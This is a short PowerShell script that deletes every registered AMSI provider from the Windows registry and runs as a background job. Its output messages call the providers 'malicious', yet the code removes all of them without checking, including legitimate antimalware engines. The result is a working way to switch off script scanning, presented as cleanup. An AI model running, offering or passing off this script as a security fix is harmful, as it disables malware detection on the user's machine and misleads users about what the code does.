Start-Job -ScriptBlock {
$regPath = "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"

if (Test-Path $regPath) {
    $providers = Get-ChildItem -Path $regPath
    foreach ($provider in $providers) {
        Write-Output "Removing malicious AMSI provider: $($provider.Name)"
        Remove-Item -Path $provider.PSPath -Recurse -Force
    }
    Write-Output "All detected AMSI providers have been removed."
} else {
    Write-Output "No AMSI providers found to remove."
}
}